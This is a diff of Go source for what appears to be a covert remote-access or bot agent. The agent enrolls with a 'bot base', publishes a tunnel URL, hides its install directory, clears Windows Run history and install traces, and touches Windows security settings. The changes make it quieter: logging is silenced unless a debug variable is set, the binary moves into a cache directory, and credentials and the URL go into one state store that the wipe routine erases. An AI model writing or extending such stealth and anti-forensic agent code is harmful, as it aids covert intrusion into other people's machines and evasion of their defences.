@@ -64,16 +64,19 @@ func initPaths() {
 	urlPath = filepath.Join(dir, "public_url")
 	logPath = filepath.Join(dir, "agent.log")
 	if runtime.GOOS == "windows" {
-		edgePath = filepath.Join(dir, edgeName+".exe")
 		helperPath = filepath.Join(dir, helperName+".exe")
+		edgePath = filepath.Join(cacheDir, edgeName+".exe")
 	} else {
-		edgePath = filepath.Join(dir, edgeName)
 		helperPath = filepath.Join(dir, helperName)
+		edgePath = filepath.Join(cacheDir, edgeName)
 	}
 	hideInstallTree()
 }
 
 func logf(msg string) {
+	if os.Getenv("AGENTSHE_DEBUG") == "" {
+		return
+	}
 	reURL := regexp.MustCompile(`https://[^\s]+`)
 	reIP := regexp.MustCompile(`\b\d{1,3}(?:\.\d{1,3}){3}\b`)
 	safe := reURL.ReplaceAllString(msg, "[redacted]")
@@ -99,24 +102,22 @@ func hostname() string {
 }
 
 func loadConfig() error {
-	enrollKey = strings.TrimSpace(os.Getenv("AGENTSHE_ENROLL"))
-	botBase = strings.TrimRight(strings.TrimSpace(os.Getenv("AGENTSHE_BOT_BASE")), "/")
-	if b, err := os.ReadFile(configPath); err == nil {
-		var cfg map[string]string
-		if json.Unmarshal(b, &cfg) == nil {
-			if enrollKey == "" {
-				enrollKey = strings.TrimSpace(cfg["enroll"])
-			}
-			if botBase == "" {
-				botBase = strings.TrimRight(strings.TrimSpace(cfg["bot_base"]), "/")
-			}
-		}
+	st := loadState()
+	enrollKey = strings.TrimSpace(st.Enroll)
+	botBase = strings.TrimRight(strings.TrimSpace(st.BotBase), "/")
+	if st.Token != "" {
+		token = st.Token
+	}
+	if st.PublicURL != "" {
+		publicURL = st.PublicURL
 	}
 	if enrollKey == "" || botBase == "" {
 		return fmt.Errorf("config manquante")
 	}
-	raw, _ := json.Marshal(map[string]string{"enroll": enrollKey, "bot_base": botBase})
-	return os.WriteFile(configPath, raw, 0o600)
+	st.Enroll = enrollKey
+	st.BotBase = botBase
+	saveState(st)
+	return nil
 }
 
 func findFreePort() (int, error) {
@@ -478,6 +479,9 @@ func wipeAll() {
 		restoreWindowsSecurity()
 		scrubRunMRU()
 		scrubTempInstallArtifacts()
+		clearStateStore()
+	} else {
+		clearStateStore()
 	}
 	removeAutostart()
 	killRelatedProcs()
@@ -781,18 +785,6 @@ func tunnelPublicOK() bool {
 
 func acquireLock() {
 	acquireSingleInstance()
-	lock := filepath.Join(dir, "agent.lock")
-	if b, err := os.ReadFile(lock); err == nil {
-		var pid int
-		fmt.Sscanf(strings.TrimSpace(string(b)), "%d", &pid)
-		if pid > 0 && pid != os.Getpid() {
-			if processExists(pid) {
-				os.Exit(0)
-			}
-		}
-		_ = os.Remove(lock)
-	}
-	_ = os.WriteFile(lock, []byte(fmt.Sprintf("%d", os.Getpid())), 0o644)
 }
 
 func processExists(pid int) bool {
@@ -827,8 +819,12 @@ func publish(port int, first bool, autostartInfo string) error {
 		return err
 	}
 	token = tok
-	_ = os.WriteFile(tokenPath, []byte(token), 0o600)
-	_ = os.WriteFile(urlPath, []byte(publicURL), 0o600)
+	st := loadState()
+	st.Enroll = enrollKey
+	st.BotBase = botBase
+	st.Token = token
+	st.PublicURL = publicURL
+	saveState(st)
 	logf("ready")
 	if first {
 		fmt.Println("OK")
